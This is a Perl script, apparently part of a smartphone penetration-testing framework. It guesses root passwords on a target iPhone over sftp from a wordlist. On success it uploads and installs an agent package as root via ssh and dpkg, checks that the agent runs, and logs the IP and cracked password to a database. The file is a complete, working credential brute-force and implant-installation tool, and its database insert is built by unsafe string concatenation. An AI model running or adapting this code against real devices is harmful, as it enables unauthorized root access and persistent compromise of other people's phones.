#!/usr/bin/perl
use Cwd;
use DBI;
use Expect;

$dir = getcwd;
$configfile = $dir . "/config";
open(CONFIG, "+<$configfile");
while (<CONFIG>)
{
        chomp;
        s/#.*//;
        s/^\s+//;
        s/\s+$//;
        ($var, $value) = split(/\s*=\s*/, $_, 2);
        $Variables{$var} = ${value};
}
$Variables{"OS"} = $^O;	
$ipaddress = $ARGV[0];		
$passfile = $ARGV[1];
 	$vulnerable = "no";
         $agent = "no";
         $command = 'sftp';
         $param = "root@" . $ipaddress;
         $timeout = 10;
         $notfound = "ssh: connect to host " . $ipaddress . " port 22: Connection refused";
         $passwordstring = $parm . "'s password: ";
         $location = $Variables{"IPHONEAGENT"};
         $putfile = $location;
         $connectstring = "Connecting to " . $ipaddress . "...";
         $installcommand = "dpkg -i " . "iphone.deb" . "\n";
         $guesspassword = "null";
         open(READFILE, "+<$passfile");
         while(<READFILE>)
         {
                 $guess = $_;
                 $guess2 = $guess . "\n";
                 $exp = Expect->spawn($command, $param) or die "Cannot spawm sftp command";
                 $exp->expect($timeout,[$connectstring]);
                 $exp->expect($timeout,["Are you sure you want to continue connecting (yes/no)?", sub {my $self = shift; $self->send("yes\n");}]); #[$notfound, return]);
                 $exp->expect($timeout, $passwordstring);
                 $exp->send($guess2);
                 if ($exp->expect($timeout, ["sftp>"]))
                 {
                        $vulnerable="yes";
                        $guesspassword = $guess;
                        $exp->send("put $putfile\n");
                        $exp->expect($timeout, ["sftp>"]);
                        $exp->send("bye\n");
                        $command2 = "ssh";
                        $exp = Expect->spawn($command2, $param);
                        $exp->expect($timeout, $passwordstring);
                        $exp->send($guess2);
                        $exp->expect($timeout, [qr'root\s*']);
                        $exp->send($installcommand);
                        $exp->expect($timeout, "Setting up com.bulbsecurity.tooltest (0.0.1-23) ...");
                        $exp->send("tooltest\n");
                        if($exp->expect($timeout,["Smartphone Pentest Framework Agent"]))
			{
                                   $agent="yes";
                        }
                  	 $exp->send("exit");
   			 $exp->soft_close();
                        last;
                }
        }
         $table = "remote";
         $guessstring = "Guess: " . $guesspassword;
         $sqlserver = $Variables{"MYSQLSERVER"};
         $username = $Variables{"MYSQLUSER"};
         $password = $Variables{"MYSQLPASS"};
         $port = $Variables{"MYSQLPORT"};
         $type = $Variables{"DATABASETYPE"};
         if ($type eq "postgres")
         {
                    $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver",$username,$password);
                    $ip2 = "\'" . $ipaddress . "\'";
                    $vulnerable2 = "\'" . $vulnerable . "\'";
                    $agent2 = "\'" . $agent . "\'";
                    $exploit = "\'" . $guessstring . "\'";

                        }
                        elsif ($type eq "mysql")
                        {
                                $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                                $ip2 = "\"" . $ipaddress . "\"";
                                $vulnerable2 = "\"" . $vulnerable . "\"";
                                $agent2 = "\"" . $agent . "\"";
                                $exploit = "\"" . $guessstring . "\"";
                        }
                        $insertquery = "INSERT INTO $table (id,ip,exploit,vuln,agent) VALUES (DEFAULT,$ip2,$exploit,$vulnerable2,$agent2)";
                        $sql = $dbh->prepare($insertquery);
                        $sql->execute;



